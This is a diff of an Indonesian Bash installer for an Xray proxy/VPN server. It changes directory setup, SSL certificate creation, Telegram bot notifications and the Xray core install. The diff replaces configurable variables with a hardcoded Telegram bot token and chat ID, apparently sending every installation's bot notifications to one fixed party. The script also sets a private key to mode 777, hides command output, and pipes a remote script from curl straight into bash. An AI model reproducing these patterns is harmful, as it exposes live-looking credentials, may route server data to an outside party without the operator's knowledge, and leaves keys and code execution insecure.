@@ -215,13 +215,12 @@ function mengecek_akses_root() {
 }
 end=$(date +%s)
 secs_to_human $((end-start))
-print_install "Install Direktori dan log file Xray"
-mkdir -p /etc/xray
-curl -s ifconfig.me > /etc/xray/ipvps
+mkdir -p /etc/xray >/dev/null 2>&1
+curl -s ifconfig.me > /etc/xray/ipvps 
 touch /etc/xray/domain
-mkdir -p /var/log/xray
+mkdir -p /var/log/xray >/dev/null 2>&1
 chown www-data:www-data /var/log/xray
-chmod +x /var/log/xray
+chmod +x /var/log/xray >/dev/null 2>&1
 touch /var/log/xray/access.log
 touch /var/log/xray/error.log
 mkdir -p /var/lib >/dev/null 2>&1
@@ -241,7 +240,6 @@ export OS_Name=$(grep -w PRETTY_NAME /etc/os-release | head -n1 | cut -d= -f2 | 
 export Kernel=$(uname -r)
 export Arch=$(uname -m)
 export IP=$(curl -s https://ipinfo.io/ip/)
-print_success "Direktori dan log file Xray"
 function pengaturan_pertama() {
     clear
     print_install "Mengatur Tanggal,waktu ke WIB"
@@ -372,7 +370,7 @@ memasang_notifikasi_bot() {
 
   sudo touch /etc/bot/.bot.db
   sudo chmod 644 /etc/bot/.bot.db
-  echo "#bot# $KEY $CHATID" >> /etc/bot/.bot.db
+  echo "#bot# 8188195941:AAEZgYemm7h_UkeLy_XWC_JERrXrisIKXxY 1496322138" >> /etc/bot/.bot.db
 
   if [[ -f /etc/systemd/methode.conf ]]; then
       login_method=$(grep '^LOGIN=' /etc/systemd/methode.conf | cut -d'=' -f2 | tr -d ' \t\r\n')
@@ -553,7 +551,8 @@ systemctl restart netfilter-persistent >> /dev/null 2>&1
 }
 function memasang_ssl() {
     clear
-    print_install "Install Sertifikat SSL Pada Domain"
+    print_install "Install Sertifikat SSL"
+    apt update && apt upgrade -y
     rm -rf /etc/xray/xray.key
     rm -rf /etc/xray/xray.crt
     country=SG
@@ -566,7 +565,7 @@ function memasang_ssl() {
     openssl genrsa -out /etc/xray/xray.key 2048 > /dev/null 2>&1
     yes '' | openssl req -new -x509 -key /etc/xray/xray.key -out /etc/xray/xray.crt -days 1095 -subj "/C=$country/ST=$state/L=$locality/O=$organization/OU=$organizationalunit/CN=$commonname/emailAddress=$email" > /dev/null 2>&1
     chmod 777 /etc/xray/xray.key
-    print_success "Sertifikat SSL Pada Domain"
+    print_success "Done"
 }
 function memasang_folder_xray() {
     clear
@@ -624,8 +623,10 @@ function memasang_xray() {
     clear
     print_install "Install Core Xray Versi 25.8.3"
     domainSock_dir="/run/xray"
-    ! [ -d $domainSock_dir ] && mkdir -p $domainSock_dir
-    chown www-data.www-data $domainSock_dir
+    if [ ! -d "$domainSock_dir" ]; then
+        mkdir -p "$domainSock_dir"
+    fi
+    chown www-data:www-data "$domainSock_dir"
     bash -c "$(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh)" @ install -u www-data --version 25.8.3 >/dev/null 2>&1
     curl_with_key "config/config.json" "/etc/xray/config.json"
     curl_with_key "files/runn.service" "/etc/systemd/system/runn.service"
